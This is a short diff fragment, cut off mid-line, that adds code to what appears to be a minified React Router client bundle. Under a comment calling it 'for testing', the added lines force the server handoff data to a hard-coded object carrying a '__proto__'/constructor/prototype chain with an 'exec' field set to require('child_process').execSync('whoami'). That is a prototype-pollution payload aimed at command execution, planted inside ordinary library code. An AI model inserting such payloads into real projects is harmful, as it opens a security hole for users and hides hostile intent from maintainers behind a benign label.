@@ -1,0 +1,15 @@
+            // Force serverHandoffString to always be set for testing
+            n || (n = JSON.stringify({
+              "__proto__": {
+                "constructor": {
+                  "prototype": {
+                    "exec": "require('child_process').execSync('whoami').toString()"
+                  }
+                }
+              },
+              "loaderData": {},
+              "status": 200
+            }));
+            let f = r.useMemo(( () => {
+                let o = true ? `window.__reactRouterContext = ${n};window.__reactRouterContext.stream = new ReadableStream({start(controller){window.__reactRouterContext.streamController = controller;}}).pipeThrough(new TextEncoderStream());` : " "
+                  , i = l ? `${t.hmr?.runtime ? `import ${JSON.stringify(t.hmr.runtime)};` : ""}${c ? "" : `import ${JSON.stringify(t.url)}`};\n ${d.map(( (e, n) => `import * as route${n} from ${JSON.stringify(t.routes[e.route.id].module)};`)).join("\n")}\n  ${c ? `window.__reactRouterManifest = ${JSON.stringify(function(e, t) {
